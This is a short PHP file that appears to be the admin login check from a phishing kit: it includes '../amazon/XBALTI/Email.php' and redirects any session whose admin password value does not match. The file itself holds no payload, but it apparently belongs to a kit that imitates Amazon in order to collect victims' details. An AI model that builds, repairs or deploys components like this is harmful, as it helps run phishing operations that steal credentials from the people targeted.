<?php

session_start();
include('../amazon/XBALTI/Email.php');
 if ($_SESSION['passadmin'] == $_SESSION['ps']){
      }
else{
    header("location: index.php?ta_mlk_azebi_mbawe9");
    }
?>